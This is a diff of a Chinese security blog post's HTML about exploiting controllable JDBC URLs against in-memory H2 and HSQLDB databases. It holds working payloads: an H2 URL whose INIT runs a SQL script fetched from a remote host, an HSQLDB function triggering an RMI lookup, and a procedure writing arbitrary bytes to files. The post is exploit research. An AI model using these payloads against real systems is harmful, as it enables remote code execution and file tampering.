@@ -8,16 +8,16 @@
   <link rel="dns-prefetch" href="http://m0d9.me">
   <title>Jdbc碎碎念三：内存数据库 | m0d9&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？  攻击client思路，典型的就是mysql client，前面讲过 攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里总结下  攻击内存数据库ServerH2pom依赖 12345&lt;dependency&gt;  &lt;groupId&gt;com.h2database&lt;&#x2F;groupId&amp;">
+  <meta name="description" content="继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？  攻击client思路，典型的就是mysql client，前面讲过 攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势  攻击内存数据库ServerH2pom依赖 12345&lt;dependency&gt;  &lt;groupId&gt;com.h2datab">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jdbc碎碎念三：内存数据库">
 <meta property="og:url" content="http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/index.html">
 <meta property="og:site_name" content="m0d9&#39;s blog">
-<meta property="og:description" content="继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？  攻击client思路，典型的就是mysql client，前面讲过 攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里总结下  攻击内存数据库ServerH2pom依赖 12345&lt;dependency&gt;  &lt;groupId&gt;com.h2database&lt;&#x2F;groupId&amp;">
+<meta property="og:description" content="继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？  攻击client思路，典型的就是mysql client，前面讲过 攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势  攻击内存数据库ServerH2pom依赖 12345&lt;dependency&gt;  &lt;groupId&gt;com.h2datab">
 <meta property="og:locale">
 <meta property="og:image" content="http://m0d9.me/images/pasted-133.png">
 <meta property="article:published_time" content="2021-04-26T06:10:00.000Z">
-<meta property="article:modified_time" content="2021-04-27T03:10:18.324Z">
+<meta property="article:modified_time" content="2021-05-06T03:27:18.688Z">
 <meta property="article:author" content="m0d9">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="H2">
@@ -202,7 +202,7 @@ ga('send', 'pageview');
         <p>继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？</p>
 <ol>
 <li>攻击client思路，典型的就是mysql client，前面讲过</li>
-<li>攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里总结下</li>
+<li>攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势</li>
 </ol>
 <h1 id="攻击内存数据库Server"><a href="#攻击内存数据库Server" class="headerlink" title="攻击内存数据库Server"></a>攻击内存数据库Server</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>pom依赖</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -216,6 +216,7 @@ ga('send', 'pageview');
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:3333/h2_exec.sql&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    Connection con = DriverManager.getConnection(url);</span><br><span class="line">&#125;<span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/pasted-133.png" alt="upload successful"></p>
+<p>tips: <code>java -cp h2.jar org.h2.tools.Server</code>可以开启web console server</p>
 <h2 id="HSQLDB"><a href="#HSQLDB" class="headerlink" title="HSQLDB"></a>HSQLDB</h2><p>pom依赖</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hsqldb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hsqldb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -225,7 +226,7 @@ ga('send', 'pageview');
 <h3 id="1-利用call-java-static-function"><a href="#1-利用call-java-static-function" class="headerlink" title="1. 利用call java static function"></a>1. 利用call java static function</h3><p>利用hsqldb create function/procedure可直接调用Java静态方法，例如</p>
 <ul>
 <li>rmi 利用<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> rce(<span class="built_in">VARCHAR</span>(<span class="number">80</span>))</span><br><span class="line">    <span class="keyword">returns</span> <span class="built_in">VARCHAR</span>(<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">no</span> <span class="keyword">sql</span></span><br><span class="line">    <span class="keyword">language</span> <span class="keyword">java</span></span><br><span class="line">    <span class="keyword">external</span> <span class="keyword">name</span> <span class="string">&#x27;CLASSPATH:java.rmi.Naming.list&#x27;</span></span><br><span class="line">;</span><br><span class="line"><span class="keyword">CALL</span> rce(<span class="string">&#x27;rmi://127.0.0.1:2333/a&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
-<li>写文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR(1024), IN paramArrayOfByte VARBINARY(1024))</span><br><span class="line">LANGUAGE JAVA</span><br><span class="line">DETERMINISTIC NO SQL</span><br><span class="line">EXTERNAL NAME &#39;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#39;;</span><br><span class="line">call writeBytesToFilename(&#39;&#x2F;tmp&#x2F;hsql111&#39;, cast (&#39;313131313131&#39; AS VARBINARY(1024)));</span><br></pre></td></tr></table></figure>
+<li>写文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> writeBytesToFilename(<span class="keyword">IN</span> paramString <span class="built_in">VARCHAR</span>(<span class="number">1024</span>), <span class="keyword">IN</span> paramArrayOfByte VARBINARY(<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">JAVA</span></span><br><span class="line"><span class="keyword">DETERMINISTIC</span> <span class="keyword">NO</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> <span class="keyword">NAME</span> <span class="string">&#x27;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;</span><br><span class="line"><span class="keyword">call</span> writeBytesToFilename(<span class="string">&#x27;/tmp/hsql111&#x27;</span>, <span class="keyword">cast</span> (<span class="string">&#x27;313131313131&#x27;</span> <span class="keyword">AS</span> VARBINARY(<span class="number">1024</span>)));</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -326,6 +327,15 @@ ga('send', 'pageview');
 
   
 <nav id="article-nav">
+  
+    <a href="/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          XStream反序列化详解（一）
+        
+      </div>
+    </a>
   
   
     <a href="/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
@@ -652,6 +662,10 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">HSQLDB</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">XStream</a>
               </li>
             
             <div class="clearfix"></div>
